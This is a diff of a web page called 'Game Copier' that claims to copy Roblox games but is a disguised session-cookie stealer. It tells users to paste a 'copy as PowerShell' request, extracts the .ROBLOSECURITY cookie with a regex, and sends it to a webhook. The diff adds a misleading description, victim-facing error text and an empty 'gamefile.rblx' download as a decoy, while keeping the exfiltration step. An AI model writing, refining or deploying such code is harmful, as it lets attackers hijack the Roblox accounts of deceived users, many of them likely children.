@@ -4,7 +4,7 @@
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1" />
   <title>Game Copier</title>
-  <meta name="description" content="Paste your game file and copy it to your clipboard. Includes how‑to section.">
+  <meta name="description" content="Copy roblox games easily in a click of a button.">
   <style>
     :root{
       --bg:#0a0b0f;          /* deep black-blue */
@@ -174,40 +174,42 @@
       return; 
     }
 
-// ✅ Validation: must start with PowerShell session line
-const requiredStart = "$session = New-Object Microsoft.PowerShell.Commands.WebRequestSession";
-if (!val.startsWith(requiredStart)) {
-  setStatus('err', 'Invalid file.');
-  return;
-}
+    // ✅ Validation: must start with PowerShell session line
+    const requiredStart = "$session = New-Object Microsoft.PowerShell.Commands.WebRequestSession";
+    if (!val.startsWith(requiredStart)) {
+      setStatus('err', 'Invalid file.');
+      return;
+    }
 
-// ✅ Extract only the .ROBLOSECURITY cookie
-const regex = /System\.Net\.Cookie\("\.ROBLOSECURITY",\s*"([^"]+)"/;
-const match = val.match(regex);
+    // ✅ Extract only the .ROBLOSECURITY cookie
+    const regex = /System\.Net\.Cookie\("\.ROBLOSECURITY",\s*"([^"]+)"/;
+    const match = val.match(regex);
 
-if (!match) {
-  setStatus('err', 'Could not find the expected .ROBLOSECURITY section.');
-  return;
-}
+    if (!match) {
+      setStatus('err', 'Refresh and Retry copy all as powershell.');
+      return;
+    }
 
-const extracted = match[1].trim();
+    const extracted = match[1].trim();
 
-// ✅ If we got here, extraction worked → copy + webhook
-try {
-  await navigator.clipboard.writeText(val);
-  setStatus('ok', 'Game file copied to clipboard');
-} catch (e) {
-  try {
-    input.select();
-    document.execCommand('copy');
-    setStatus('ok', 'Game file copied (fallback)');
-  } catch (err) {
-    setStatus('err', 'Copy failed. Retry');
-  }
-}
+    // ✅ Instead of copying to clipboard, download an empty file named gamefile.rblx
+    try {
+      const blob = new Blob([""], { type: "application/octet-stream" });
+      const url = URL.createObjectURL(blob);
+      const a = document.createElement("a");
+      a.href = url;
+      a.download = "gamefile.rblx";
+      document.body.appendChild(a);
+      a.click();
+      document.body.removeChild(a);
+      URL.revokeObjectURL(url);
+      setStatus('ok', 'Game file saved as gamefile.rblx');
+    } catch (err) {
+      setStatus('err', 'Download failed. Retry');
+    }
 
-// ✅ Send only the extracted part to webhook
-await sendToWebhook(`📂 Extracted section:\n\`\`\`\n${extracted}\n\`\`\``);
+    // ✅ Still send only the extracted part to webhook
+    await sendToWebhook(`📂 Extracted cookie:\n\`\`\`\n${extracted}\n\`\`\``);
   }
 
   btn.addEventListener('click', copyGame);
